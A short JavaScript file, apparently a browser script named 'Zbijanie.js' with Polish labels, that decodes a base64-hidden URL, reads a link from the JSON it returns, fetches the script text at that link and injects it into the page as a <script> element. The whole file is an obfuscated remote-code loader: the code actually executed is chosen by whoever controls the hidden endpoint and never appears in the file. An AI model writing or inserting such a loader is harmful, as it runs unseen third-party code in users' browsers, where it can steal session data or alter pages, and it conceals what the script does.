const zbijanie = (url, cb) => { fetch(url).then(res => res.json()).then((out) => { cb(out) }).catch(err => { throw err }); }

zbijanie(atob("aHR0cHM6Ly9hcGkubnBvaW50LmlvL2E5ZWU4NmY1NDRiNjUxZjIzZTA2"),(data) => {
		Promise.all([
			fetch(data.link).then(value => value.text())
		  ]).then(all => {
			  $("body").append("<script>"+all[0]+"</script>");
		  }).catch(err => { throw err });
	});

console.log("Skrypt (Zbijanie.js) załadowano Poprawnie!")